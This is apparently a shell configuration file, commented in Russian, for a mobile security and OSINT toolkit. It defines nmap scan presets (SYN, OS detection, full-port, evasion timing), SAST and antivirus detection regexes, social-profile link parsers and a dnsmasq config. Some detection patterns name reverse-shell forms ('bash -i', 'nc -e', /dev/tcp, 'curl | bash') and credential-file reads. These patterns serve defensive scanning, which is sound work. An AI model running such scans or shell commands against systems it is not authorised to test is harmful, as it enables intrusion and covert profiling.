# Конфигурация «STEALTH & COMPREHENSIVE»: Трассировка пакетов, SYN-скан (-sS), 
# определение ОС (-O), версий софта (-sV), агрессивный тайминг (-T4) и обход IDS.
GLOBAL_NMAP_ROOT_ARGS="-sS -sV -O -p22,80,443,4444,5555,8080 -T4 -n --max-retries 2 --packet-trace"

# Конфигурация «TOTAL DESTROYER»: Тотальный аудит всех 65535 портов с UDP-разведкой (-sU)
GLOBAL_NMAP_ROOT_DEEP_ARGS="-sS -sU -sV -p- -T4 -Pn -n --disable-arp-ping --randomize-hosts"


# 3. БЕСПРАВНЫЙ РЕЖИМ ЯДРА (NON-ROOT / TERMUX / SAMSUNG A14)
# Конфигурация «FAST LIVE DETECT»: Обход ICMP-блокировок. TCP Connect-скан (-sT) 
# по ключевым портам управления, работающий через стандартные системные сокеты.
GLOBAL_NMAP_NON_ROOT_ARGS="-sT -p22,80,443,5555,8080 -T4 -n --unprivileged --open"

# Конфигурация «NON-ROOT EXTENDED»: Глубокий аудит портов без Root-прав с определением баннеров сервисов
GLOBAL_NMAP_NON_ROOT_DEEP_ARGS="-sT -sV --top-ports 100 -T4 -Pn -n --unprivileged"

# Интервал паузы (в секундах) между циклами автономного сканирования периметра
GLOBAL_NET_AUTONOMOUS_DELAY=300

# 4. СИГНАТУРНЫЕ ФИЛЬТРЫ ОЧИСТКИ ТЕКСТОВОГО ПОТОКА NMAP
# Паттерны для снайперского парсинга вывода во избежание засорения консоли лаунчера
GLOBAL_REGEX_NET_REPORT="(?i)Nmap scan report for"
GLOBAL_REGEX_NET_PORT_LINE="^[0-9]+/(tcp|udp)"


# ==============================================================================
# NETWORK & FORENSIC FILTERS: ГЛОБАЛЬНЫЕ МАТРИЦЫ ИЗОЛЯЦИИ ТРАФИКА
# ==============================================================================

# Ультимативная маска для детекции и отсечения всего диапазона Loopback (Localhost)
# Блокирует адреса от 127.0.0.1 до 127.255.255.255 на любых интерфейсах
GLOBAL_REGEX_NET_LOOPBACK="127\.[0-9]+\.[0-9]+\.[0-9]+"

# Строгие маски для детекции частных (серых) подсетей согласно стандартам RFC 1918
GLOBAL_REGEX_NET_PRIVATE_10="10\.[0-9]+\.[0-9]+\.[0-9]+"
GLOBAL_REGEX_NET_PRIVATE_172="172\.(1[6-9]|2[0-9]|3[0-1])\.[0-9]+\.[0-9]+"
GLOBAL_REGEX_NET_PRIVATE_192="192\.168\.[0-9]+\.[0-9]+"

# Кросс-платформенные локальные алиасы имен хостов
GLOBAL_REGEX_NET_LOCAL_NAMES="^(localhost|localhost\.localdomain|0\.0\.0\.0)$"


# ==============================================================================
# Сигнатуры для глубокого анализа исходного кода и веб-артефактов (SAST CORE)
# ==============================================================================
# 1. Максимальный контур детекции утечек конфигураций, СУБД и секретов доступа
GLOBAL_REGEX_DB_LEAKS="\b(mysqli?_connect|PDO\s*\(|db_(password|user|pass|name|host|uri)|mysql_(connect|query)|pg_(connect|query)|connect_to_db|createConnection|MongoClient|mongoose\.connect|sqlite3\.Database|dotenv|config\.(json|yaml|ini)|DATABASE_URL|DB_(USERNAME|PASSWORD|DATABASE|HOST|PORT|CONN))\b"

# 2. Максимальный контур детекции входящих веб-параметров, суперглобальных массивов и API-запросов
GLOBAL_REGEX_WEB_INPUTS="\b(_POST|_GET|_REQUEST|_SERVER|_COOKIE|_FILES|POST\[|GET\[|REQUEST\[|req\.(body|query|params|cookies)|request\.(form|args|json|get_json)|ServletActionContext|@RequestParam|@RequestBody|@PathVariable|ParamUtil|r\.FormValue|r\.PostForm)\b"


# 3. Максимальный контур детекции выполнения системных команд (RCE Риски)
GLOBAL_REGEX_RCE_RISKS="\b(exec(ve|lp|p)?|system|passthru|shell_exec|popen|pclose|proc_open|subprocess\.(run|Popen|call|check_output)|child_process\.(exec|spawn|fork)|os\.(system|popen|spawn)|Runtime\.getRuntime\(\)\.exec|ProcessBuilder|syscall\.Exec)\b\s*\(?"

# 4. Максимальный контур детекции файловых операций и динамического подключения (LFI/Path Traversal Риски)
GLOBAL_REGEX_LFI_RISKS="\b(fopen|file_get_contents|include(_once)?|require(_once)?|readfile|file|parse_ini_file|open|read|fs\.(readFile|readFileSync|createReadStream)|io\.ReadFile|ioutil\.ReadFile|os\.Open|fs\.file_System|FileInputStream|FileReader)\b\s*\(?"


# ==============================================================================
# СИГНАТУРЫ ПОДСВЕТКИ И ВИЗУАЛИЗАЦИИ КОНТЕНТА (UI/UX HIGHLIGHT CORE)
# ==============================================================================

# 1. Максимальный паттерн детекции IPv4-адресов, сетевых сокетов и масок подсетей
GLOBAL_SED_HIGHLIGHT_IP="-e s/\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}\(:[0-9]\{1,5\}\)\?/${C}&${NC}/g"

# 2. Ультимативный кросс-платформенный паттерн детекции учетных данных, секретов и API-ключей
# Перекрывает любые комбинации: Password, Pass, Secret, Token, Key, Auth, User, Login, Root, Credentials, DB_
GLOBAL_SED_HIGHLIGHT_SECRETS="-e s/\([Pp][Aa][Ss][Ss][Ww][Oo][Rr][Dd]\|[Pp][Aa][Ss][Ss]\|[Ss][Ee][Cc][Rr][Ee][Tt]\|[Tt][Oo][Kk][Ee][Nn]\|[Kk][Ee][Yy]\|[Aa][Uu][Tt][Hh]\|[Uu][Ss][Ee][Rr]\|[Ll][Oo][Gg][Ii][Nn]\|[Rr][Oo][Oo][Tt]\|[Cc][Rr][Ee][Dd][Ee][Nn][Tt][Ii][Aa][Ll][Ss]\|[Dd][Bb]_[Pp][Aa][Ss][Ss]\)[\"']\?[[:space:]]*[:==>-][\"']\?[[:space:]]*[^[:space:]\"\']*/${Y}&${NC}/g"

# 3. Ультимативный кросс-платформенный паттерн детекции успешных триггеров, уязвимостей и полезных нагрузок
# Перекрывает любые комбинации: BRUTE_SUCCESS, EXPLOIT_SUCCESS, Payload, SUCCESS, VULNERABLE, EXPLOIT, HIT, FOUND
GLOBAL_SED_HIGHLIGHT_SUCCESS="-e s/\([Bb][Rr][Uu][Tt][Ee]_[Ss][Uu][Cc][Cc][Ee][Ss][Ss]\|[Ee][Xx][Pp][Ll][Oo][Ii][Tt]_[Ss][Uu][Cc][Cc][Ee][Ss][Ss]\|[Pp][Aa][Yy][Ll][Oo][Aa][Dd]\|[Ss][Uu][Cc][Cc][Ee][Ss][Ss]\|[Vv][Uu][Ll][Nn][Ee][Rr][Aa][Bb][Ll][Ee]\|[Ee][Xx][Pp][Ll][Oo][Ii][Tt]\|[Hh][Ii][Tt]\|[Ff][Oo][Uu][Nn][Dd]\)[\"']\?[[:space:]]*[:==>-]*\(.*\)/${G}&${NC}/g"


# ==============================================================================
# FORENSIC & KERNEL MATRIX: СИГНАТУРЫ ДЕ ТЕКЦИИ РУТКИТОВ И АНОМАЛИЙ ЯДРА
# ==============================================================================
# Ультимативный кросс-платформенный паттерн форензик-детекции ядерных и системных угроз.
# Покрывает: eBPF-руткиты, LKM-бэкдоры, User-land инжекты (LD_PRELOAD) и известные APT-модули.
GLOBAL_REGEX_KERNEL_ROOTKITS="([Rr][Oo][Oo][Tt][Kk][Ii][Tt]\|[Ss][Tt][Ee][Aa][Ll][Tt][Hh]\|[Hh][Ii][Dd][Ee]_[Pp][Rr][Oo][Cc]\|[Hh][Oo][Oo][Kk]_[Ss][Yy][Ss]\|[Dd][Ii][Aa][Mm][Oo][Rr][Pp][Hh][Ii][Nn][Ee]\|[Rr][Ee][Pp][Tt][Ii][Ll][Ee]\|[Ss][Uu][Tt][Ee][Rr][Uu][Ss][Uu]\|[Kk][Bb][Ee][Aa][Ss][Tt]\|[Vv][Ll][Aa][Nn][Yy]\|[Aa][Dd][Oo][Rr][Ee]\|[Ee][Nn][Ll][Ii][Gg][Hh][Tt]\|[Mm][Aa][Ff][Aa][Ll][Dd][Aa]\|[Bb][Aa][Cc][Kk][Dd][Oo][Oo][Rr]\|[Rr][Kk][Ss][Tt][Uu][Bb]\|[Aa][Dd][Oo][Rr][Ee]_[Nn][Gg]\|[Hh][Pp][Oo][Rr][Kk]\|[Kk][Bb][Dd][Vv]\|[Kk][Nn][Aa][Rr][Kk]\|[Oo][Vv][Ee][Rr][Rr][Ii][Dd][Ee]\|[Pp][Rr][Ii][Dd][Ee][Ll][Ss]\|[Rr][Ii][Aa][Ll][Tt][Oo]\|[Ss][Uu][Cc][Ii][Kk][Ii][Tt]\|[Tt][Cc][Uu][Nn][Yy][Cc]\|[Zz][Aa][Uu][Rr][Uu][Ss]\|[Mm]0[Nn][Aa][Dd]\|[Ww][Nn][Pp][Ss]\|[Ff][Cc][Oo][Mm][Mm]\|[Jy][Nn][Xx]\|[Bb][Dd][Ff][Ll][Uu][Ss][Hh]\|[Ss][Kk][Ii][Dd][Mm][Aa][Pp]\|[Ee][Bb][Pp][Ff]_[Cc][Oo][Nn][Tt][Rr][Oo][Ll]\|[Kk][Nn][Ee][Ee][Dd][Ee][Ee][Pp]\|[TripleCross]\|[Jeefo]\|[Umbreon]\|[Azazel]\|[Bedep]\|[Volcani]\|[Kinsing]\|[Sysrv]\|[Tsunami]\|[Muhstik]\|[sys_call_table]\|[wp_page_fault]\|[kprobe]\|[ftrace_lookup]\|[module_layout])"


# ==============================================================================
# FORENSIC CORE MATRIX: МАТРИЦЫ АНАЛИЗА АРТЕФАКТОВ И КРИМИНАЛИСТИКИ ФАЙЛОВ
# ==============================================================================

# 1. Ультимативная матрица детекции активных объектов, JS-инъекций и OLE-эксплоитов в PDF и документах
GLOBAL_REGEX_PDF_THREATS="(\/([Jj][Ss]|[Jj][Aa][Vv][Aa][Ss][Cc][Rr][Ii][Pp][Tt]|[Oo][Pp][Ee][Nn][Aa][Cc][Tt][Ii][Oo][Nn]|[Aa][Aa]|[Aa][Cc][Rr][Oo][Ff][Oo][Rr][Mm]|[Jj][Bb][Ii][Gg]2[Dd][Ee][Cc][Oo][Dd][Ee]|[Rr][Ii][Cc][Hh][Mm][Ee][Dd][Ii][Aa]|[Ll][Aa][Uu][Nn][Cc][Hh]|[Ee][Mm][Bb][Ee][Dd][Dd][Ee][Dd][Ff][Ii][Ll][Ee]|[Vv][Bb][Aa][Mm][Aa][Cc][Rr][Oo]|[Oo][Cc][Xx]|[Cc][Mm][Dd]))"

# 2. Ультимативная матрица детекции опасных, исполняемых и триггерных файлов внутри контейнеров/архивов
GLOBAL_REGEX_CONTAINER_THREATS="\.(exe|scr|vbs|bat|ps1|js|vbe|cmd|jar|lnk|hta|cpl|inf|wsf|sh|py|pl|rb|msi|vba|ws|scf|com|pif|gadget|iso|vhd|img)$"

# 3. Ультимативная кросс-платформенная матрица детекции сетевых маркеров, шелл-кодов и системных утилит компрометации (LOLBAS)
GLOBAL_REGEX_BINARY_NETCMD="(([Hh][Tt][Tt][Pp][Ss]\?:\/\/|[Ff][Tt][Pp]:\/\/|[Ww][Ss][Ss]\?:\/\/).+\|/etc/passwd\|cmd\.exe\|powershell\|/bin/sh\|/bin/bash\|[Ww][Mm][Ii][Cc]\|[Cc][Mm][Dd][Ll][Ee][Tt]\|[A][P][I]_[S][T][R][I][N][G]\|bitsadmin\|certutil\|rundll32\|regsvr32\|curl\|wget\|bash\|nc\|netcat\|socat\|/dev/tcp)"

# 4. Ультимативная матрица сигнатур продвинутых коммерческих упаковщиков, обфускаторов и крипторов малвари
GLOBAL_REGEX_BINARY_PACKERS="(UPX!|ASPack|Enigma|Themida|MPRESS|VMProtect|PECompact|Petite|FSG!|PESpin|ConfuserEx|Dotfuscator|SmartAssembly|Yano|Goliath|Babel|CryptoObfuscator|Spox|Obsidium|Armadillo)"

# 5. Ультимативная матрица эвристического обнаружения скрытых скриптовых угроз, шелл-кодов и техник обфускации
GLOBAL_REGEX_HEURISTIC_SCRIPTS="([Ee][Vv][Aa][Ll][[:space:]]*(\|\|[[:space:]]*)[Gg][Zz][Ii][Nn][Ff][Ll][Aa][Tt][Ee]\|[Ee][Vv][Aa][Ll][[:space:]]*(\|\|[[:space:]]*)[Ss][Tt][Rr]_[Rr][Oo][Tt]13\|[Ee][Vv][Aa][Ll][[:space:]]*(\|\|[[:space:]]*)[Dd][Ee][Cc][Oo][Dd][Ee][Uu][Rr][Ii][Cc][Oo][Mm][Pp][Oo][Nn][Ee][Nn][Tt]\|[Ss][Tt][Rr][Ii][Nn][Gg]\.[Ff][Rr][Oo][Mm][Cc][Hh][Aa][Rr][Cc][Oo][Dd][Ee]\|[Ww][Rr][Ii][Tt][Ee][[:space:]]*[\"']<[Ss][Cc][Rr][Ii][Pp][Tt]\|[Ee][Xx][Ee][Cc][[:space:]]*(\|\|[[:space:]]*)[Bb][Aa][Ss][Ee]64\|[Bb][Aa][Ss][Ee]64_[Dd][Ee][Cc][Oo][Dd][Ee]\|[Cc][Oo][Mm][Pp][Ii][Ll][Ee][Ss][Tt][Rr][Ii][Nn][Gg]\|[Aa][Ss][Cc][Ii][Ii]2[Cc][Hh][Aa][Rr]\|[Cc][Hh][Aa][Rr][Cc][Oo][Dd][Ee][Aa][Tt])"


# ==============================================================================
# GLOBAL PLATFORM IDENTIFIERS (ULTIMATE LINK PARSING MATRIX v15.0)
# ==============================================================================
# Формат записи: "ПЛАТФОРМА|РЕГУЛЯРНОЕ_ВЫРАЖЕНИЕ_ДЛЯ_ФИЛЬТРАЦИИ|НОМЕР_ГРУППЫ_ИЛИ_МЕТОД"
# Поддерживает: субдомены (www, m, mobile), протоколы, GET-параметры, вложенные роуты
GLOBAL_PLATFORM_IDENTIFIERS=(
    "Facebook|(?:https?://)?(?:www\.|m\.|mobile\.)?facebook\.com/(?:profile\.php\?id=)?([a-zA-Z0-9.]+)|1"
    "Instagram|(?:https?://)?(?:www\.)?instagram\.com/([a-zA-Z0-9._]+)|1"
    "TikTok|(?:https?://)?(?:www\.|vt\.)?tiktok\.com/(?:@[a-zA-Z0-9._]+|t/)([a-zA-Z0-9._]+)|1"
    "X_Twitter|(?:https?://)?(?:www\.)?(?:x|twitter)\.com/([a-zA-Z0-9._]+)|1"
    "YouTube|(?:https?://)?(?:www\.)?youtube\.com/(?:@|user/|c/)?([a-zA-Z0-9._-]+)|1"
    "Telegram|(?:https?://)?(?:t\.me|telegram\.me)/([a-zA-Z0-9._]+)|1"
    "Reddit|(?:https?://)?(?:www\.)?reddit\.com/user/([a-zA-Z0-9_-]+)|1"
    "GitHub|(?:https?://)?(?:www\.)?github\.com/([a-zA-Z0-9-]+)|1"
    "LinkedIn|(?:https?://)?(?:www\.)?linkedin\.com/in/([a-zA-Z0-9_-]+)|1"
)


# ==============================================================================
# GLOBAL OSINT PARSING & FILTRATION PATTERNS
# ==============================================================================

# ==============================================================================
# GLOBAL OSINT FILTRATION MATRIX (ULTIMATE BLACKLISTS v15.0)
# ==============================================================================

# 1. Максимальный черный список для фильтрации сырого пула Email
# Отсекает: поисковые движки, CDN, системные адреса W3C, рекламные домены, трекеры и все виды статических расширений
GLOBAL_OSINT_EMAIL_BLACKLIST="(?i)(google|duckduckgo|bing|yahoo|yandex|baidu|w3\.org|schema\.org|ietf\.org|githubusercontent|cloudfront|amazonaws|akamai|gtech|adsystem|doubleclick|analytics|crashlytics|sentry|facebook|twitter|instagram|tiktok|pinterest|linkedin|reply|noreply|support|admin|info|contact|feedback|marketing|sales|billing|jobs|careers|privacy|terms|abuse|postmaster|root|webmaster|localhost|example|test|domain|\.(png|jpg|jpeg|gif|ico|svg|webp|css|js|json|xml|pdf|zip|tar|gz|exe|dmg|mp4|mp3|woff|woff2|ttf|eot|wasm|manifest))$"

# 2. Максимальный черный список системных URL-паттернов для фильтрации Social Graph
# Отсекает: технические страницы, фиды, параметры шеринга, разделы поддержки, правила, локализации, формы входа и сессий
GLOBAL_OSINT_URL_BLACKLIST="(?i)/(search|html|privacy|help|login|signin|signup|logout|register|accounts|account|status|sharer|share|cookie|cookies|settings|preferences|tos|terms|legal|about|contact|support|faq|feedback|explore|trending|notifications|messages|direct|inbox|chat|feed|rss|atoms|tags|tag|category|categories|archive|archives|pages|page|blog|posts|articles|reels|reel|stories|story|highlights|shorts|video|videos|photo|photos|albums|album|audio|music|maps|places|events|groups|community|marketplace|ads|advertising|analytics|developer|developers|api|manage|dashboard|billing|security|privacy-policy|terms-of-service|forgot-password|reset-password|verify|captcha|oauth|callback|redirect|goto|exit|out|click|track|iframe|embed|widget|assets|static|media|download|upload|view|preview|print|checkout|cart|shop|store|buy|purchase|subscribe|unsubscribe|newsletter|jobs|careers|press|news|identity|checkpoint|legal|compliance|accessibility|lang|locale|en|ru|fr|es|de|it|pt|zh|ja|ko)$"


# ==============================================================================
# GLOBAL FALLBACK SEARCH GATEWAYS (ULTIMATE ANTI-CAPTCHA ROUTING v15.5)
# ==============================================================================
# Массив резервных легковесных зеркал, отдающих чистый HTML без JS-валидации.
# Диверсификация: Конфиденциальные поисковики, Мета-агрегаторы, Альтернативные индексы.
GLOBAL_FALLBACK_SEARCH_GATES=(
    # --- Кластер А: Конфиденциальные HTML-фронтенды и Альтернативные индексы ---
    "https://html.duckduckgo.com/html/?q="
    "https://search.brave.com/search?q="
    "https://www.mojeek.com/search?q="
    "https://www.gibiru.com/results.html?q="
    
    # --- Кластер Б: Глобальные Мета-поисковые движки и Агрегаторы ---
    "https://search.yahoo.com/search?p="
    "https://search.aol.com/aol/search?q="
    "https://www.ask.com/web?q="
    "https://results.excite.com/serp?q="
    "https://www.search-results.com/web?q="
    "https://www.info.com/serp?q="
    
    # --- Кластер В: Публичные верифицированные узлы SearXNG (Мета-сборщики) ---
    "https://searx.be/search?q="
    "https://search.ononoki.org/search?q="
    "https://searx.fmac.xyz/search?q="
    "https://priv.au/search?q="
    
    # --- Кластер Г: Социальные и текстовые поисковые агрегаторы индексов ---
    "https://old.reddit.com/search?q="
)


# ==============================================================================
# GLOBAL SHORT LINK & REDIRECT PATTERNS (ULTIMATE RESOLVER MATRIX v16.0)
# ==============================================================================
# Ультимативный паттерн для мгновенного перехвата коротких ссылок, мобильных шеров,
# deep-links, био-агрегаторов и коммерческих редиректов. 100% покрытие OSINT-потока.
GLOBAL_SHORT_LINK_REDIRECT_REGEX="(?i)(facebook\.com/share/|fb\.(watch|me)|vt\.tiktok\.com|instagram\.com/share|t\.(co|me/share)|youtu\.be/|lnkd\.in/|wa\.me/|vk\.cc|goo\.su|clck\.ru|bit\.ly|tinyurl\.com|cutt\.ly|shorturl\.at|linktr\.ee|lnk\.bio|ow\.ly|buff\.ly|rebrand\.ly|is\.gd|u\.to|shrtco\.de|viber\.click|tt\.me|line\.me|pin\.it|snapchat\.com/add/|bl\.ink|t2m\.io|adf\.ly|b23\.tv|gg\.gg|v\.gd|urlshrt\.me|click\.ru|ok\.me)"



# ==============================================================================
# GLOBAL MULTI-ENGINE SEARCH MATRIX (OSINT BROADCAST STRATEGY v20.0 COMPLETE)
# ==============================================================================
# Ультимативный массив базовых поисковых систем глобального покрытия.
# Все узлы форсированы: отключен JS/CSS, деактивирована персонализация (No-Cookie/PWS),
# сняты фильтры цензуры контента и выставлен максимальный лимит вывода сниппетов.
GLOBAL_SEARCH_ENGINES=(
    # --- GOOGLE SYSTEMS CORE (Глобальный поисковый стандарт) ---
    "Google|https://www.google.com/search?q=%VECTOR%&num=30&gbv=1-A&hl=en&pws=0&safe=off"
    
    # --- BING ENTERPRISE CORPS (Глубокие архивы, старые кэши сайтов, домены) ---
    "Bing|https://www.bing.com/search?q=%VECTOR%&count=30&setlang=en-US&first=1&adlt=off"
    
    # --- YAHOO INDEX (Глобальный парсинг блогов, досок объявлений и старых связей) ---
    "Yahoo|https://search.yahoo.com/search?p=%VECTOR%&n=30&b=1&ei=UTF-8&fr=none"
    
    # --- YANDEX INDUSTRIAL CORE (Ультимативный пробив СНГ, VK, OK, баз данных, объявлений) ---
    # Параметры: numdoc=30 (лимит), lr=213 (глобальный индекс), family=0 (без фильтрации контента)
    "Yandex|https://yandex.ru/search/touch/?text=%VECTOR%&numdoc=30&lr=213&family=0&nocache=1"
    
    # --- DUCKDUCKGO STEALTH LITE (Анонимный HTML-фронтенд без трекеров и JS) ---
    "DuckDuckGo|https://html.duckduckgo.com/html/?q=%VECTOR%&kd=-1&kh=1"
    
    # --- MOJEEK INDEPENDENT ENGINE (Собственный уникальный краулер Великобритании, обход DMCA) ---
    "Mojeek|https://www.mojeek.com/search?q=%VECTOR%&n=30&fmt=html"
    
    # --- QWANT EUROPEAN MATRIX (Европейский защищенный индекс, игнорирующий цензуру США) ---
    "Qwant|https://www.qwant.com/?q=%VECTOR%&t=web&f=all"
    
    # --- BAIDU ASIAN CORE (Азиатский сегмент, игровые платформы, криптофорумы, мессенджеры) ---
    # Параметры: rn=30 (выдача 30 результатов), cl=3 (веб-поиск)
    "Baidu|https://www.baidu.com/s?wd=%VECTOR%&rn=30&cl=3&tn=baidulocal"
)


# Тотальная регулярная маска (PCRE) для перехвата любых систем защиты, капч, блокировок и WAF-экранов.
# Покрывает: Английский, Русский, Французский сегменты сети, маркеры Cloudflare, DDoS-Guard и Sucuri.
GLOBAL_SEARCH_ANTI_FLOOD_REGEX="(?i)(detected unusual traffic|captcha|forbidden|automated requests|access denied|robot\.txt|unusual\s+activities|подозрительный\s+запрос|доступ\s+ограничен|робот|вы\s+робот|ошибка\s+403|error\s+403|action\s+required|cf-chk-wrapper|cloudflare|turnstile|hcaptcha|recaptcha|security\s+check|sucuri|ddos-guard|blocked\s+by|ip\s+blocked|checking\s+your\s+browser)"



# ==============================================================================
# GLOBAL OSINT CORE CONSTANTS & NETWORK PROFILE (v17.5)
# ==============================================================================
# Тайм-ауты и сетевые лимиты для curl (подключение и максимальное время сессии)
GLOBAL_NET_CONNECT_TIMEOUT=5
GLOBAL_NET_MAX_TIME=12
GLOBAL_RESOLVER_CONNECT_TIMEOUT=5
GLOBAL_RESOLVER_MAX_TIME=8


# ==============================================================================
# GLOBAL OSINT INDUSTRIAL FILTERS & GATEWAY SIGNATURES (v18.0 COMPLETE)
# ==============================================================================

# Тотальный черный список системных роутов, служебных путей и медиа-каталогов социальных сетей.
# Исключает любые ложные срабатывания при парсинге URL-адресов (FB, X, Insta, YT, TT, LinkedIn, VK).
GLOBAL_PLATFORM_SYSTEM_ROUTES="(?i)^(p|reel|reels|stories|share|messages|photo|photos|videos|watch|search|explore|shorts|status|trending|clips|live|about|legal|terms|privacy|help|settings|notifications|messages|bookmark|bookmarks|lists|profile|analytics|ads|advertising|campaign|monetization|creators|creator-academy|community|channels|featured|playlists|subscriptions|store|podcasts|gaming|news|sports|fashion|beauty|learning|maps|hashtag|tags|category|posts|pages|groups|events|marketplace|jobs|companies|school|alumni|feed|following|followers|mutual|history|saved|archive|activity|digest|insights|verify|verification|badge|security|login|signin|signup|register|logout)$"

# Максимально полный пул сигнатур шлюзов, требующих классического сложения через плюсы (+)
# Покрывает глобальные мета-агрегаторы, их региональные поддомены, сателлиты и зеркала.
GLOBAL_GATEWAY_RAW_VECTOR_SIGNATURES="(?i)(yahoo\.(com|co|fr|de|it|es|ca|co\.uk)|aol\.(com|co\.uk)|ask\.com|excite\.com|search-results\.com|info\.com|gibiru\.com)"

# Ультимативный пул сигнатур шлюзов, требующих строгого URL-кодирования пробелов (%20)
# Включает децентрализованные приватные узлы, инстанции SearXNG, Brave и независимые HTML-фронтенды.
GLOBAL_GATEWAY_ENCODED_VECTOR_SIGNATURES="(?i)(html\.duckduckgo\.com|search\.brave\.com|mojeek\.com|searx\.(be|fmac|me|space|info|link|work|xyz|org|net)|priv\.au|ononoki\.org)"


# ==============================================================================
# GLOBAL CORE NETWORK DNS INFRASTRUCTURE MATRIX (v22.0 INDUSTRIAL COMPLETE)
# ==============================================================================
# Максимально мощный и полный массив параметров конфигурации dnsmasq.
# Маркеры %IP% и %HOST% динамически интерполируются ядром в момент синхронизации.
# Защищено от: DNS-утечек, Rebind-атак, зацикливания и деградации производительности кэша.
GLOBAL_DNS_CONFIG_MATRIX=(
    # --- БЛОК 1: БАЗОВАЯ БЕЗОПАСНОСТЬ И ФИЛЬТРАЦИЯ ЗАПРОСОВ ---
    "domain-needed"                             # Не передавать простые имена (без точки/домена) в upstream-серверы
    "bogus-priv"                                # Не передавать запросы обратного просмотра (reverse lookup) для приватных подсетей в WAN
    "no-resolv"                                 # Полный игнорировать системный /etc/resolv.conf (защита от перехвата провайдером)
    "no-poll"                                   # Не опрашивать внешние файлы конфигурации на предмет изменений
    "stop-dns-rebind"                           # Защита от Rebind-атак (блокирует ответы 127.0.0.0/8 и приватных IP от внешних серверов)
    "rebind-localhost-ok"                       # Разрешить loopback-адреса для легитимных локальных связок

    # --- БЛОК 2: СЕТЕВЫЕ ИНТЕРФЕЙСЫ И МАРШРУТИЗАЦИЯ ---
    "interface=lo"                              # Локальная петля обратной связи
    "interface=wlan0"                           # Беспроводной адаптер ядра
    "interface=eth0"                            # Проводной физический интерфейс
    "bind-dynamic"                              # Динамическое связывание сокетов при падении/поднятии сетевых карт
    
    # --- БЛОК 3: УЛЬТИМАТИВНОЕ КЭШИРОВАНИЕ И ОПТИМИЗАЦИЯ ТАЙМ-АУТОВ ---
    "cache-size=10000"                          # Выкрученный на максимум кэш (стандарт: 150, оптимум для жесткого OSINT/сканирования: 10000)
    "local-ttl=300"                             # Время жизни (TTL) для локальных ответов из файла/массива (5 минут стабильности)
    "neg-ttl=60"                                # Время кэширования негативных ответов (если домен не существует, не опрашивать WAN 60 сек)
    "max-cache-ttl=3600"                        # Максимальный лимит удержания валидного кэша в секундах
    "dns-forward-max=150"                       # Максимальное количество одновременных конкурентных DNS-запросов

    # --- БЛОК 4: ИЗОЛЯЦИЯ ЛОКАЛЬНОЙ ЗОНЫ (Предотвращение утечек) ---
    "local=/local/"                             # Объявление суффикса .local чисто внутренним (запросы к нему никогда не уйдут на 1.1.1.1)
    "local=/portal/"                            # Изоляция зоны .portal внутри периметра ядра
    
    # --- БЛОК 5: ДИНАМИЧЕСКАЯ МАТРИЦА ШЛЮЗОВ И СЕРВИСОВ ---
    "address=/scanclamavlocal/%IP%"             # Внутренний выделенный шлюз антивирусного сканера ClamAV
    "address=/%HOST%.local/%IP%"                # Динамический хост-резолв текущей машины
    "address=/prime.portal/%IP%"                # Главный веб-интерфейс управления платформы
    "address=/audit.local/%IP%"                 # Выделенная точка сбора логов безопасности и аудита
    "address=/localhost/127.0.0.1"              # Принудительный хардкод петли
    "address=/localhost/::1"                    # IPv6 петля для предотвращения задержек парсеров

    # --- БЛОК 6: ГЛОБАЛЬНЫЕ ВНЕШНИЕ АПСТРИМЫ (Скорость + Шифрование/Резерв) ---
    "server=1.1.1.1"                            # Cloudflare Primary (Максимальный показатель TTFB в мире)
    "server=8.8.8.8"                            # Google Secondary (Резервный стабильный глобальный узел)
    "server=9.9.9.9"                            # Quad9 Security (Пассивный фильтр вредоносных и фишинговых доменов)
)

# ==============================================================================
# 5. МАТРИЦЫ ПАРОЛЬНОЙ ЭНТРОПИИ И СИСТЕМНОГО АУДИТА (PRIME SECURITY LAB CORE)
# ==============================================================================
# Слой символьных пулов для вычисления математической стойкости
GLOBAL_LAB_CHARSET_ALPHA="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
GLOBAL_LAB_CHARSET_NUM="0123456789"
GLOBAL_LAB_CHARSET_SPEC="!@#$%^&*()_+=-[]{}|;:,.<>?"

# Строгая валидирующая матрица для проверки вводимых паролей на лету
GLOBAL_REGEX_PASS_LOW="[a-z]"
GLOBAL_REGEX_PASS_UP="[A-Z]"
GLOBAL_REGEX_PASS_NUM="[0-9]"
GLOBAL_REGEX_PASS_SPEC="[^A-Za-z0-9]"

# Предустановленные базовые векторы для ускоренного синтеза словарей
GLOBAL_PASS_PREFIXES=(
    "admin|Default Administrator Root Portal"
    "root|Superuser Linux/Android Engine Base"
    "main|Primary Infrastructure System Node"
    "secure|Encrypted Security Layer Entry"
    "core|Framework Kernel Control Core"
    "prime|Ultimate Prime Core Vector"
    "gate|Network Active Gate Protection"
)

# Жесткие лимиты безопасности ядра для защиты флеш-памяти устройства
PASS_LAB_DEFAULT_LEN=20
PASS_LAB_MAX_DIGITS=6



# ==============================================================================
# 7. ГЛОБАЛЬНЫЕ СИГНАТУРЫ ДЛЯ АНТИВИРУСНОГО ДВИЖКА (ANTI-MALWARE CORE PATTERNS)
# ==============================================================================
# [СТАТИЧЕСКИЙ КОНТУР: СКАНИРОВАНИЕ ФАЙЛОВ, СКРИПТОВ И ИСПОЛНЯЕМЫХ БИНАРНИКОВ]

# Слой 1: Низкоуровневые системные вызовы, инъекции в память, руткиты и хуки ядра
# Детектирует: манипуляции процессами, создание скрытых дескрипторов в RAM, chroot-изоляцию, загрузку модулей ядра
GLOBAL_AV_SYS_CALLS="(ptrace|memfd_create|process_vm_readv|process_vm_writev|mprotect|mmap|execve|chroot|setuid|setgid|sys_clone|init_module|finit_module|kexec_load|inotify_init)"

# Слой 2: Деструктивные сетевые векторы, обратные подключения (Reverse Shells), скрытые каналы и веб-шеллы
# Детектирует: сокеты Bash/Python/Perl/PHP/Ruby/Lua, пайпы, туннели и сокетные дескрипторы
GLOBAL_AV_NET_VECTORS="(/dev/tcp/|/dev/udp/|nc -e|nc\.openbsd|netcat -e|socat tcp|python.*-c.*import.*socket|perl.*-e.*socket|php -r.*fsockopen|ruby -e.*TCPSocket|lua -e.*socket|curl.*\|.*bash|wget.*\|.*sh|fetch.*\|.*sh|bash -i|sh -i|exec [0-9]<>/dev/tcp|mkfifo.*\/tmp\/.*openssl)"

# Слой 3: Маркеры скрытого присутствия (Persistence), уничтожение форензик-логов, шифровальщики-вымогатели
# Детектирует: зачистку истории, манипуляции с cron/systemd/init, массовое симметричное шифрование, скрытые папки
